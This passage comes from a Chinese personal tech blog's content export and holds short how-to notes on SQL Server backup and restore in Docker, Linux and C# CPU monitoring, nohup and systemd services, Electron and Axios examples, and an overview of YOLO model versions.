(&#x27;w5&#x27;);GOSELECT * FROM Users;GO BACKUP12345USE master;GOBACKUP DATABASE mydb TO DISK = &#x27;mydblog.bak&#x27; WITH COMPRESSION, INIT, STATS=5;GO RESTORE12345678910111213141516171819202122update users set username = &#x27;zsss1&#x27; where userid= 1;goselect * from users;goUSE master;GO -- 检查数据库是否存在，如果存在则删除IF EXISTS (SELECT name FROM sys.databases WHERE name = &#x27;mydb&#x27;)BEGIN DROP DATABASE mydb;ENDGO -- 还原数据库RESTORE DATABASE mydbFROM DISK = &#x27;mydblog.bak&#x27; GO if restore err SET RECOVERY SIMPL 12345678910111213141516171819USE[master] GO ALTER DATABASE mydb SET RECOVERY SIMPLE WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY SIMPLE --简单模式 GO RESTORE DATABASE mydb FROM DISK = &#x27;mydblog.bak&#x27; GOALTER DATABASE mydb SET RECOVERY FULL WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY FULL --还原为完全模式 GOuse mydb go select * from users;go bak file12345var lib docker/var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/merged/var/opt/mssql/data/mydblog.bak/var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/diff/var/opt/mssql/data/mydblog.bak","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"}],"author":"mu"},{"title":"Linux CPU now","slug":"Linux-CPU-now","date":"2024-08-04T17:51:08.000Z","updated":"2024-11-13T16:54:31.946Z","comments":true,"path":"2024/08/05/Linux-CPU-now/","permalink":"https://banjinmei.github.io/2024/08/05/Linux-CPU-now/","excerpt":"","text":"linux 查看正在 cpu占用在Linux中，可以使用多种命令来查看哪个进程正在使用CPU资源。以下是几个常用的命令： top - 实时显示系统中各个进程的资源占用情况，包括CPU使用率。 tophtop - top的增强版，提供更直观的界面，需要单独安装。 htopps - 显示当前运行的进程信息，结合aux选项可以查看CPU占用率。 1ps aux --sort=-%cpu | head pidstat - 用于监视个别任务的CPU和内存使用情况，通常与时间结合使用。 1pidstat 1 这些命令会以实时或者定时的方式输出CPU占用前几的进程，帮助识别和解决CPU占用高的问题。 查看docker12345docker ps docker ps -adocker start cont C# 获取CpuwinPerformanceCounter 实例，用于监控总 CPU 使用率（”_Total” 表示监控所有 CPU 核心的总体使用情况）。 1dotnet add package System.Diagnostics.PerformanceCounter 12345678910111213141516// 创建一个用于获取 CPU 占用率的 PerformanceCounter 对象 PerformanceCounter cpuCounter = new PerformanceCounter(&quot;Processor&quot;, &quot;% Processor Time&quot;, &quot;_Total&quot;); // 先执行一次 NextValue()，因为第一次调用通常会返回 0 cpuCounter.NextValue(); Thread.Sleep(1000); // 等待 1 秒以便获取准确值 while (true) &#123; // 获取当前的 CPU 使用率 float cpuUsage = cpuCounter.NextValue(); Console.WriteLine($&quot;当前 CPU 占用率: &#123;cpuUsage&#125;%&quot;); // 每隔 1 秒获取一次数据 Thread.Sleep(1000); &#125; Linux 环境中，System.Diagnostics.PerformanceCounter 不可用，因此需要采用其他方法来获取 CPU 占用率。一个常见的方法是读取 &#x2F;proc&#x2F;stat 文件并解析内容，或者通过调用 Linux 的 top 或 vmstat 命令来获取 CPU 使用率。 以下是一个通过读取 &#x2F;proc&#x2F;stat 文件来计算 CPU 占用率 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051using System;using System.IO;using System.Threading;class Program&#123; static void Main() &#123; // 初始的 CPU 时间信息 var initialCpuTimes = GetCpuTimes(); Thread.Sleep(1000); // 等待 1 秒 while (true) &#123; // 获取当前的 CPU 时间信息 var currentCpuTimes = GetCpuTimes(); // 计算 CPU 使用率 var totalDiff = (currentCpuTimes.total - initialCpuTimes.total); var idleDiff = (currentCpuTimes.idle - initialCpuTimes.idle); var cpuUsage = 100.0 * (1.0 - (double)idleDiff / totalDiff); Console.WriteLine($&quot;当前 CPU 占用率: &#123;cpuUsage:F2&#125;%&quot;); // 更新初始时间 initialCpuTimes = currentCpuTimes; Thread.Sleep(1000); // 每秒更新一次 &#125; &#125; // 解析 /proc/stat 文件并计算 CPU 时间 private static (long total, long idle) GetCpuTimes() &#123; var cpuLine = File.ReadAllText(&quot;/proc/stat&quot;).Split(&#x27;\\n&#x27;)[0]; var cpuValues = cpuLine.Split(new[] &#123; &#x27; &#x27; &#125;, StringSplitOptions.RemoveEmptyEntries); // 获取各个时间值 long user = long.Parse(cpuValues[1]); long nice = long.Parse(cpuValues[2]); long system = long.Parse(cpuValues[3]); long idle = long.Parse(cpuValues[4]); long iowait = long.Parse(cpuValues[5]); long irq = long.Parse(cpuValues[6]); long softirq = long.Parse(cpuValues[7]); // 计算总时间和空闲时间 long total = user + nice + system + idle + iowait + irq + softirq; return (total, idle); &#125;&#125; 通过读取 &#x2F;proc&#x2F;stat 文件，提取 CPU 的各个时间字段。GetCpuTimes() 方法解析第一行的 cpu 统计数据，其中各字段代表用户、系统、空闲、IO等待等时间。计算 CPU 使用率：totalDiff 是前后两次采集的总 CPU 时间差。idleDiff 是前后两次采集的空闲时间差。cpuUsage 使用公式 1.0 - (idleDiff &#x2F; totalDiff) 计算 CPU 占用率。注意事项该代码通过每隔 1 秒采集一次数据来计算 CPU 使用率，因此可以实时显示 CPU 占用率。GetCpuTimes() 方法中读取 &#x2F;proc&#x2F;stat 文件的内容，这个文件是 Linux 系统中获取 CPU 时间的标准方法。代码适用于支持 &#x2F;proc&#x2F;stat 文件的 Linux 系统。 程序捕获 top 命令的输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445using System;using System.Diagnostics;using System.Text.RegularExpressions;class Program&#123; static void Main() &#123; // 执行 `top` 命令 ProcessStartInfo psi = new ProcessStartInfo &#123; FileName = &quot;top&quot;, Arguments = &quot;-bn1&quot;, // 一次性打印输出 RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true &#125;; using (Process process = Process.Start(psi)) &#123; using (var reader = process.StandardOutput) &#123; string output = reader.ReadToEnd(); ParseCpuUsage(output); &#125; &#125; &#125; private static void ParseCpuUsage(string topOutput) &#123; // 匹配 top 命令中的 &quot;Cpu(s): xx.x% us&quot; 字段 Regex regex = new Regex(@&quot;Cpu\\(s\\):\\s+(\\d+\\.\\d+)%\\s+us&quot;, RegexOptions.Compiled); var match = regex.Match(topOutput); if (match.Success) &#123; string cpuUsage = match.Groups[1].Value; Console.WriteLine($&quot;当前系统 CPU 使用率: &#123;cpuUsage&#125;%&quot;); &#125; else &#123; Console.WriteLine(&quot;无法解析 CPU 使用率。&quot;); &#125; &#125;&#125; 判断OS系统 123456789101112131415var os = Environment.OSVersion;var isWindows = os.Platform == PlatformID.Win32NT || os.Platform == PlatformID.Win32S || os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.WinCE;if (isWindows)&#123; Console.WriteLine(&quot;当前操作系统是 Windows.&quot;);&#125;else&#123; // 对于 .NET Framework, 没有直接的方法来区分 Linux 和 macOS // 但是通常来说，如果不是 Windows，且在非 Windows 平台上运行，则可以认为是 Linux 或 macOS Console.WriteLine(&quot;当前操作系统可能是 Linux 或 macOS.&quot;);&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Go Background","slug":"Go-Background","date":"2024-08-04T17:44:01.000Z","updated":"2024-08-04T17:52:58.000Z","comments":true,"path":"2024/08/05/Go-Background/","permalink":"https://banjinmei.github.io/2024/08/05/Go-Background/","excerpt":"","text":"debian go程序 后台运行要在Debian系统上将Go程序设置为后台运行，使用nohup命令和&amp;符号。 编译Go程序，生成可执行文件。 1go build -o myapp main.go 使用nohup将程序放到后台运行，并将输出重定向到nohup.out文件。 1nohup ./myapp &amp; 如果您想要程序在系统启动时自动运行，可以创建一个systemd服务文件。 创建一个名为myapp.service的文件： 1sudo nano /etc/systemd/system/myapp.service 在编辑器中添加以下内容： 123456789101112[Unit]Description=My Go ApplicationAfter=network.target [Service]Type=simpleExecStart=/path/to/your/myappRestart=on-failureRestartSec=5 [Install]WantedBy=multi-user.target 保存并退出编辑器。 启用并启动服务： 12sudo systemctl enable myapp.servicesudo systemctl start myapp.service Go程序就会在Debian系统上作为服务后台运行。 c# run~123456789sudo nohup dotnet run /root/socketa/TcpSk &gt; output20240805.log 2&gt;&amp;1 &amp; sudo nohup dotnet run /root/netser/xx &gt; output1.log 2&gt;&amp;1 &amp;ps -ef | grep nohup kill","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"},{"name":"nohup","slug":"nohup","permalink":"https://banjinmei.github.io/tags/nohup/"}],"author":"mu"},{"title":"C# keep alive","slug":"C-keep-alive","date":"2024-08-04T16:38:00.000Z","updated":"2024-08-04T17:49:40.000Z","comments":true,"path":"2024/08/05/C-keep-alive/","permalink":"https://banjinmei.github.io/2024/08/05/C-keep-alive/","excerpt":"","text":"在C#中，想让一个控制台应用程序保持运行而不依赖 Cnsole.ReadKey()，可以通过多种方式实现。 1. 使用事件循环可以使用 EventWaitHandle 或者其他类似的同步原语来创建一个事件循环，让程序保持在等待状态。 12345678910111213141516171819using System;using System.Threading;class Program&#123; static void Main() &#123; // 创建一个自动重置的事件对象 EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(&quot;Press any key to exit...&quot;); // 等待事件被设置，如果没有接收到信号，则保持等待状态 waitHandle.WaitOne(); Console.Clear(); &#125;&#125; 使用无限循环 你可以创建一个无限循环，直到你手动终止程序。 1234567891011121314//cpu占用高~using System;class Program&#123; static void Main() &#123; while (true) &#123; // 程序在这里保持运行状态，等待事件或其他中断。 Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); &#125; &#125;&#125; 3. 使用定时器创建一个定时器，定期执行某些任务，或者用于控制程序行为。 123456789101112131415161718192021222324using System;using System.Threading;class Program&#123; static void Main() &#123; Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); // 创建一个新的计时器并设定间隔时间（毫秒） Timer timer = new Timer(TimerCallback, null, 0, 1000); // 防止主线程退出 Console.ReadKey(); // 停止定时器 timer.Dispose(); &#125; private static void TimerCallback(Object state) &#123; Console.WriteLine(&quot;The program is still running...&quot;); &#125;&#125; 4. 使用异步等待如果你使用的是 .NET Core 或 .NET 5 及更高版本，可以利用 Task.Run 来创建一个持续运行的任务。 1234567891011121314151617181920212223using System;using System.Threading.Tasks;class Program&#123; static async Task Main(string[] args) &#123; Console.WriteLine(&quot;The program is running. Press CTRL+C to exit.&quot;); await Task.Run(async () =&gt; &#123; while (true) &#123; // 模拟一些工作 await Task.Delay(1000); Console.WriteLine(&quot;Doing work...&quot;); &#125; &#125;); // 等待按键，确保主线程不会立即退出 Console.ReadKey(); &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"console","slug":"console","permalink":"https://banjinmei.github.io/tags/console/"}],"author":"mu"},{"title":"Electron App","slug":"Electron-App","date":"2024-08-04T13:28:01.000Z","updated":"2024-08-04T17:49:58.000Z","comments":true,"path":"2024/08/04/Electron-App/","permalink":"https://banjinmei.github.io/2024/08/04/Electron-App/","excerpt":"","text":"Electron fetch API发送HTTP请求1npm install electron --save-dev 创建：1your-electron-app/ ├── main.js├── renderer.js└── index.html main.js - Electron 1234567891011121314151617181920212223242526272829const &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);function createWindow () &#123; // 创建浏览器窗口 let win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true &#125; &#125;); // 加载index.html文件 win.loadFile(&#x27;index.html&#x27;);&#125;app.whenReady().then(createWindow);renderer.js - Electron的渲染器进程文件，使用fetch发送请求：document.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; document.getElementById(&#x27;result&#x27;).textContent = JSON.stringify(data, null, 2); &#125;) .catch(error =&gt; &#123; console.error(&#x27;请求失败:&#x27;, error); &#125;);&#125;); index.html - 应用的HTML文件，包含一个用于显示结果的元素： 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Electron Fetch Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Electron Fetch Example&lt;/h1&gt; &lt;pre id=&quot;result&quot;&gt;&lt;/pre&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;要运行这个Electron应用程序，请在your-electron-app目录下创建一个package.json文件，如果还没有的话：&#123; &quot;name&quot;: &quot;your-electron-app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;main.js&quot;, &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;electron .&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: &#123; &quot;electron&quot;: &quot;^your-electron-version&quot; &#125;&#125; 确保将”electron”: “^your-electron-version”替换为实际的Electron版本号。然后，在终端中运行以下命令来启动Electron应用程序： 1npm start 解析JSON修改renderer.js文件来实现 1234567891011121314151617181920document.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;) .then(response =&gt; &#123; // 检查响应状态 if (!response.ok) &#123; throw new Error(&#x27;网络响应错误&#x27;); &#125; return response.json(); &#125;) .then(data =&gt; &#123; // 解析数据并展示 const &#123; title, body &#125; = data; document.getElementById(&#x27;title&#x27;).textContent = title; document.getElementById(&#x27;body&#x27;).textContent = body; &#125;) .catch(error =&gt; &#123; console.error(&#x27;请求失败:&#x27;, error); &#125;);&#125;); index.html文件中添加两个元素，用于显示title和body： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Electron JSON Parsing Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;文章标题：&lt;/h1&gt; &lt;p id=&quot;title&quot;&gt;&lt;/p&gt; &lt;h2&gt;文章正文：&lt;/h2&gt; &lt;pre id=&quot;body&quot;&gt;&lt;/pre&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 现在，当Electron应用程序运行时，它会从指定的URL请求数据，解析JSON响应，然后提取并显示title和body字段。请确保你的Electron应用程序的main.js文件正确地加载了index.html文件，并且renderer.js文件被包含在页面中。这样，当页面加载完成时，renderer.js中的代码将执行，从服务器获取数据并更新DOM元素。 socketElectron 应用可以同时使用 Node.js 和 Chromium 的 API，这使得它既可以在主进程中使用 Node.js 的 net 模块来创建 TCP 连接，也可以在渲染进程中使用 WebSocket 来与服务器进行实时通信。以下是在 Electron 的主进程中使用 net 模块创建 TCP 连接的示例： 123456789101112131415161718192021222324252627282930313233343536const &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);const net = require(&#x27;net&#x27;);function createWindow () &#123; const win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true, contextIsolation: false &#125; &#125;); // 并加载应用的 index.html win.loadFile(&#x27;index.html&#x27;); &#125;app.whenReady().then(() =&gt; &#123; setTimeout(() =&gt; &#123; var client = net.connect(&#x27;16551&#x27;, &#x27;1xxx&#x27;, function()&#123; console.log(&#x27;已经与服务器连接&#x27;); client.write(&#x27;Yes\\r\\n&#x27;); &#125;); client.on(&#x27;data&#x27;, function(data)&#123; console.log(data.toString()); client.end();//one msg end &#125;); client.on(&#x27;end&#x27;, function()&#123; console.log(&#x27;客户端连接中断&#x27;); &#125;); &#125;, 2000); // &#125;);app.whenReady().then(createWindow); 打包Electron 应用的打包和运行过程可以分为几个步骤，包括开发、打包、分发和安装。以下是这个过程的概述： 1. 开发阶段在开发阶段，你将使用 Web 技术（HTML、CSS、JavaScript）和 Node.js API 来构建你的 Electron 应用。初始化项目：创建一个新的项目目录，初始化 package.json 文件。安装依赖：使用 npm 安装 Electron (electron) 和其他所需的依赖。编写代码：编写主进程 (main.js) 和渲染进程的代码（通常是 HTML、CSS 和 JavaScript 文件）。 2. 本地运行在开发过程中，你将经常运行你的应用以测试功能。使用 electron . 或 npm start 命令来启动你的 Electron 应用。 3. 打包应用打包应用是将你的应用的所有文件和依赖项打包成一个可执行的程序或安装包。选择打包工具：Electron 社区提供了多种打包工具，如 electron-packager、electron-builder 和 electron-forge。配置打包工具：根据你选择的打包工具，配置打包选项，如平台（Windows、macOS、Linux）、架构（x64、ia32、armv7l）等。 4. 使用 electron-builder 打包示例electron-builder 是一个流行的打包工具，它提供了丰富的配置选项和跨平台支持。安装 electron-builder： 1npm install electron-builder --save-dev 在 package.json 中配置 build 字段： 123456789101112131415&#123; &quot;build&quot;: &#123; &quot;appId&quot;: &quot;your.app.id&quot;, &quot;mac&quot;: &#123; &quot;category&quot;: &quot;your.app.category&quot; &#125;, &quot;win&quot;: &#123; &quot;target&quot;: &quot;nsis&quot; &#125;, &quot;linux&quot;: &#123; &quot;target&quot;: &quot;deb&quot;, &quot;category&quot;: &quot;your.app.category&quot; &#125; &#125;&#125; 运行打包命令： 1npm run build 5. 分发和安装打包完成后，你可以将生成的可执行文件或安装包分发给用户。Windows：用户可以下载 .exe 安装程序并运行。macOS：用户可以下载 .dmg 或 .pkg 安装包并安装。Linux：用户可以下载 .deb 或 .AppImage 文件并安装。 6. 签名应用在某些平台上，你可能需要对应用进行代码签名以确保安全性和通过应用商店的审核。macOS：使用 Xcode 或其他工具进行签名。Windows：使用 Windows SDK 的 signtool 进行签名。注意事项在打包前，请确保在 package.json 中设置了 build.appId 和其他相关配置。不同的打包工具可能有不同的配置选项，具体请参考相应工具的文档。在发布应用之前，确保在目标平台上进行了充分的测试。打包和发布 Electron 应用是一个复杂的过程，涉及到多个步骤和工具。Electron 官方文档和社区提供了大量资源来帮助开发者完成这个过程。 or electron-builder，你可能还想添加一些 npm 脚本命令来简化构建过程： 1234567&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;electron .&quot;, &quot;build&quot;: &quot;electron-builder -w&quot;, &quot;build:mac&quot;: &quot;electron-builder -m&quot;, &quot;build:linux&quot;: &quot;electron-builder -l&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;&#125; 这里，build 命令会为 Windows 构建应用程序，build:mac 会为 macOS 构建，build:linux 会为 Linux 构建。使用这些命令可以快速构建特定平台的应用程序。 https://www.electronjs.org/docs/latestAPI DOC","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"}],"author":"mu"},{"title":"Axios Cors  && Timestamp","slug":"Axios-Cors-Timestamp","date":"2024-08-04T04:16:25.000Z","updated":"2024-08-04T17:50:16.000Z","comments":true,"path":"2024/08/04/Axios-Cors-Timestamp/","permalink":"https://banjinmei.github.io/2024/08/04/Axios-Cors-Timestamp/","excerpt":"","text":"具体步骤安装 Axios: 使用 Axios 进行 HTTP 请求。 封装 Axios: 将 Axios 封装成一个模块以便在项目中复用。 解决跨域问题: 在 vite.config.ts 文件中配置代理以解决跨域问题。 调用 API: 在 Vue 组件中使用封装的 Axios 进行数据请求和显示。 安装 Axios首先，确保你已经安装了 Axios： bashCopy Codenpm install axios 封装 Axios创建一个 http 文件夹并在其中创建一个 request.ts 文件： src&#x2F;http&#x2F;request.ts: 12345678910111213141516171819202122232425262728293031323334353637import axios from &#x27;axios&#x27;;const service = axios.create(&#123; baseURL: &#x27;http://localhost:16552/api/zblack&#x27;, // 根据你的后端API地址调整 timeout: 5000, // 请求超时时间&#125;);// 请求拦截器service.interceptors.request.use( config =&gt; &#123; return config; &#125;, error =&gt; &#123; console.error(&#x27;请求错误:&#x27;, error); return Promise.reject(error); &#125;);// 响应拦截器service.interceptors.response.use( response =&gt; &#123; const res = response.data; if (res.isOk) &#123; return res.rsData; &#125; else &#123; console.error(&#x27;请求错误:&#x27;, res.msg); return Promise.reject(new Error(res.msg || &#x27;Error&#x27;)); &#125; &#125;, error =&gt; &#123; console.error(&#x27;响应错误:&#x27;, error); return Promise.reject(error); &#125;);export default service; 3. 解决跨域问题在 vite.config.ts 文件中添加代理配置： vite.config.ts: 12345678910111213141516import &#123; defineConfig &#125; from &#x27;vite&#x27;;import vue from &#x27;@vitejs/plugin-vue&#x27;;export default defineConfig(&#123; plugins: [vue()], server: &#123; proxy: &#123; &#x27;/api&#x27;: &#123; target: &#x27;http://localhost:16552&#x27;, changeOrigin: true, rewrite: (path) =&gt; path.replace(/^\\/api/, &#x27;&#x27;), &#125;, &#125;, &#125;,&#125;); 4. 在 Vue 组件中调用 API使用封装的 Axios： 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%&quot;&gt; &lt;el-table-column fixed prop=&quot;UserBlackID&quot; label=&quot;UserBlackID&quot; width=&quot;150&quot; /&gt; &lt;el-table-column prop=&quot;UserBlockerID&quot; label=&quot;UserBlockerID&quot; width=&quot;120&quot; /&gt; &lt;el-table-column prop=&quot;UserBlockedID&quot; label=&quot;UserBlockedID&quot; width=&quot;120&quot; /&gt; &lt;el-table-column prop=&quot;CreatedAt&quot; label=&quot;CreatedAt&quot; width=&quot;200&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackReason&quot; label=&quot;Reason&quot; width=&quot;300&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackIP&quot; label=&quot;IP&quot; width=&quot;150&quot; /&gt; &lt;el-table-column prop=&quot;UserBlackStatus&quot; label=&quot;Status&quot; width=&quot;120&quot; /&gt; &lt;/el-table&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot; setup&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;;import request from &#x27;@/http/request&#x27;; // 根据你的路径调整const tableData = ref([]);onMounted(async () =&gt; &#123; try &#123; const response = await request(&#123; url: &#x27;/api/zblack/FindUserBlackLLL&#x27; &#125;); tableData.value = response; &#125; catch (error) &#123; console.error(&#x27;获取数据失败:&#x27;, error); &#125;&#125;);&lt;/script&gt;&lt;style scoped lang=&quot;scss&quot;&gt;@import &#x27;./index.scss&#x27;;&lt;/style&gt; 调用成功则跨域问题 解决~ 什么是Unix时间戳(Unix timestamp)：Unix时间戳(Unix timestamp)，或称Unix时间(Unix time)、POSIX时间(POSIX time)，是一种时间表示方式，定义为从格林威治时间1970年01月01日08时00分00秒起至现在的总秒数。Unix时间戳不仅被使用在Unix 系统、类Unix系统中，也在许多其他操作系统中被广泛采用。时间戳(timestamp)，通常是一个字符序列，唯一地标识某一刻的时间。数字时间戳技术是数字签名技术一种变种的应用。 时间戳转化：第一步：把时间戳转成Date对象(为什么乘以1000，因为1000毫秒换算成秒等于1秒)const date &#x3D; new Date(1722408384*1000) 将date进行格式化，转成对应的字符串（因为时间戳格式化太常见，可以封装，formatData） 12345678910const formatDate = (timestamp: number) =&gt; &#123; timestamp = timestamp * 1000 const date = new Date(timestamp) console.log(timestamp + &#x27;&#x27; + date) return `$&#123;date.getFullYear()&#125;-$&#123;String(date.getMonth() + 1).padStart(2, &#x27;0&#x27;)&#125;-$&#123;String(date.getDate()).padStart( 2,&#x27;0&#x27;)&#125; $&#123;String(date.getHours()).padStart(2, &#x27;0&#x27;)&#125;:$&#123;String(date.getMinutes()).padStart(2, &#x27;0&#x27;)&#125;:$&#123;String( date.getSeconds() ).padStart(2, &#x27;0&#x27;)&#125;`&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"aaxios","slug":"aaxios","permalink":"https://banjinmei.github.io/tags/aaxios/"},{"name":"cors","slug":"cors","permalink":"https://banjinmei.github.io/tags/cors/"},{"name":"timestamp","slug":"timestamp","permalink":"https://banjinmei.github.io/tags/timestamp/"}],"author":"mu"},{"title":"yolov10","slug":"yolov10","date":"2024-07-29T15:49:16.000Z","updated":"2024-07-29T16:00:42.000Z","comments":true,"path":"2024/07/29/yolov10/","permalink":"https://banjinmei.github.io/2024/07/29/yolov10/","excerpt":"","text":"YOLOv3、YOLov3-Ultralytics和YOLOv3u概述本文件概述了三种密切相关的物体检测模型，即YOLOv3、YOLOv3-Ultralytics 和YOLOv3u。1.YOLOv3:这是”You Only Look Once”(YOLO)物体检测算法的第三个版本。YOLOv3最初由约瑟夫-雷德蒙(Joseph Redmon)开发，通过引入多尺度预测和三种不同大小的检测内核等功能，YOLOv3 对其前身进行了改进。YOLOv3-Ultralvtics: 这是Ultralvtics’ YOLov3 模型的实现。它再现了原始的 YOLOv3 架构，并提供了更多的功2.能，如支持更多的预训练模型和更简单的定制选项。YOLOv3u:这是 yOLOv3-ultralvtics 的更新版本，它采用了YOLOv8 模型中使用的无锚、无对象性分割头,3.YOLOv3u 保留了与 YOLOv3 相同的骨干和颈部结构，但使用了YOLOv8 更新的检测头。 YOLov4:高速、精确的物体探测欢迎访问Ultralytics YoLov4 文档页面，YOLOv4 是由 Alexey Bochkovskiy于 2020,年在https://github.com/AlexeyAB/darknet 推出的最先进的实时物体检测器。 YOLOv4 的设计在速度和精确度之间实现了最佳平衡，是许多应用的理想选择。 YOLOv5u 代表着物体检测方法的进步。YOLOv5u 源自 开发的 YOLOv5 Ultralvtics 开发的模型的基础结构，YOLOv5u整合了无锚点、无对象性的分割头，这是以前的 YOLov8模型中引入的功能。这一调整完善了模型的架构，从而提高了物体检测任务中的精度·速度权衡。鉴于经验结果及其衍生特征，YOLov5u 为那些在研究和实际应用中寻求稳健解决方案的人提供了一个高效的替代方案。 美团YOLOv6 是一款先进的物体检测器，在速度和准确性之间取得了出色的平衡，是实时应用的热门选择。该模型在架构和训练方案上引入了几项显著的改进，包括双向串联(Bic)模块、锚点辅助训练(AAT)策略以及改进的骨干和颈部设计，从而在 COCo 数据集上实现了最先进的精度。 Bic AAT YOLOv7:可训练的免费书包YOLOv7 是最先进的实时物体检测器，在5FPS 到 160 FPS 的范围内，其速度和准确性都超过了所有已知的物体检测器。在GPU V100 上，YOLOv7 的准确率(56.8% AP)在 30 FPS 或更高的所有已知实时物体检测器中是最高的。此外，YOLOv7 在速度和准确性上都优于 YOLOR、YOLOX、Scaled-YOLOv4、YOLOv5 等其他物体检测器。该模型是在 MS COC0 数据集上从头开始训练的，没有使用任何其他数据集或预先训练的权重。YoLov7 的源代码可在GitHub 上获取。 YOLOv8YOLOv8 是YOL0 系列实时物体检测器的最新迭代产品，在精度和速度方面都具有尖端性能。在之前YOL0 版本的基础上，YOLov8 引入了新的功能和优化，使其成为广泛应用中各种物体检测任务的理想选择。 YOLov9:物体检测技术的飞跃发展YOLov9 引入了可编程梯度信息IPGI) 和广义高效层聚合网络(GELAN) 等开创性技术，标志着实时目标检测领域的重大进步。该模型在效率、准确性和适应性方面都有显著提高，在 MS COC0 数据集上树立了新的标杆。YOLOv9 项目虽然是由一个独立的开源团队开发的，但它建立在以下机构提供的强大代码库基础之上 ultralytics YoLov5提供的强大代码库，展示了人工智能研究界的协作精神。 YOLO强在目标检测 YOLOv10:实时端到端物体检测YOLOv10 是清华大学研究人员在 Ultralvtics Python,清华大学的研究人员在 YOLOv10软件包的基础上，引入了一种新的实时目标检测方法，解决了YOL0 以前版本在后处理和模型架构方面的不足。通过消除非最大抑制(NMS)和优化各种模型组件，YOLOv10 在显著降低计算开销的同时实现了最先进的性能。大量实验证明，YOLOv10 在多个模型尺度上实现了卓越的精度-延迟权衡。实时物体检测旨在以较低的延迟准确预测图像中的物体类别和位置。YOL0 系列在性能和效率之间取得了平衡，因此一直处于这项研究的前沿。然而，对 NMS的依赖和架构上的低效阻碍了最佳性能的实现。YOLOv10 通过为无NMS 训练引入一致的双重分配和以效率-准确性为导向的整体模型设计策略，解决了这些问题。 主要功能1.无 NMS训练 利用一致的双重分配来消除对 NMS 的需求，从而减少推理延迟。2.整体模型设计:从效率和准确性的角度全面优化各种组件，包括轻量级分类头、空间通道去耦向下采样和等级引导块设计。3.增强的模型功能:纳入大核卷积和部分自注意模块，在不增加大量计算成本的情况下提高性能。 无NMS训练 最核心特点 YOLov10 有多种型号，可满足不同的应用需求:YOLOv10-N:用于资源极其有限环境的纳米版本。YOLOv10-S:兼顾速度和精度的小型版本。YOLOv10-M:通用中型版本。YOLOv10-B:平衡型，宽度增加，精度更高，YOLOv10-L:大型版本，精度更高，但计算资源增加。YOLOv10-X:超大型版本可实现最高精度和性能。 通俗易懂的YOLOv10环境构建过程使用的前提。NVIDIA GPU:推荐至少是GTX 1060&#x2F;RTX2060级别或更高:。CUDA Toolkit版本:建议使用CUDA 